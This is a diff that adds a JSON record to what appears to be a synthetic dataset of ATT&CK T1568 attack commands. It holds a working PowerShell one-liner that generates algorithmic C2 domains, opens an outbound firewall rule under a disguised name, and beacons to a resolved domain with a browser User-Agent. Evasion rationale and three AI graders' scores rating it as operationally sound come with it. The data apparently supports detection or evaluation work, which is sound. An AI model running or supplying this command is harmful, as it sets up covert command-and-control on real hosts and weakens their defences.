@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $seed=(Get-Date -Format 'yyyyMMdd')+$env:COMPUTERNAME.Length; $tlds=@('net','org','co'); $names=1..15|ForEach-Object { 'cdn{0}-{1}.c2sync.{2}' -f $_,$seed,($tlds[(Get-Random -Min 0 -Max $tlds.Count)]) }; netsh advfirewall firewall add rule name='sys_upd_8443' dir=out action=allow protocol=TCP remoteport=8443 | Out-Null; Clear-DnsClientCache; $dom=$names | Where-Object { Resolve-DnsName $_ -Server '1.1.1.1' -Type A -ErrorAction SilentlyContinue } | Select-Object -First 1; if($dom){ $ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64)'; Invoke-WebRequest -Uri ('https://{0}:8443/beacon' -f $dom) -Headers @{ Host=$dom; 'User-Agent'=$ua } -TimeoutSec (Get-Random -Min 3 -Max 9) -UseBasicParsing } }",
+  "explanation": "Generates DGA-based candidate domains, forces resolution via Cloudflare DNS, opens outbound TCP/8443, and performs an HTTPS beacon to the dynamically resolved domain.",
+  "rationale_steps": [
+    "Generate multiple domains using a time-and-hostseed DGA.",
+    "Flush DNS cache and resolve candidates via a chosen resolver (1.1.1.1).",
+    "Open egress on an uncommon port to reduce signature matches.",
+    "Beacon to the first resolvable domain using HTTPS and a benign User-Agent."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-84d6188c",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell scriptblock is well-formed with balanced quotes/braces, valid cmdlets/parameters, and proper pipelines/format operators.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates candidate domains, resolves them via a specified DNS server, and beacons to a resolved endpoint (T1568), though the firewall rule and DNS cache flush may require elevation and can fail under non-admin privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:48:02.449986Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced braces, parentheses, and quotes, proper use of semicolons as statement separators, valid cmdlet syntax throughout, and correct string formatting operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 by generating DGA-style candidate domains seeded with date and hostname length, resolving them via an external DNS server to evade local monitoring, opening a firewall rule for outbound C2 traffic on port 8443, and beaconing to the first resolved domain with a realistic browser User-Agent header — all operationally coherent and aligned with dynamic resolution C2 tradecraft.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:20:47.383041Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed PowerShell script block with balanced braces, valid use of the format operator (-f), and correct piping logic.",
+        "semantic_score": 3,
+        "semantic_justification": "The command accurately implements the logic of T1568 (DGA/Dynamic Resolution), but has two significant semantic flaws: first, the 'netsh' command requires local administrator privileges which contradicts the 'Privilege: None' metadata; second, 'Resolve-DnsName' returns an object, and stringifying that object directly in the URI/Headers without selecting the '.Name' property may result in an invalid URL/Host header.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:20:58.678889Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
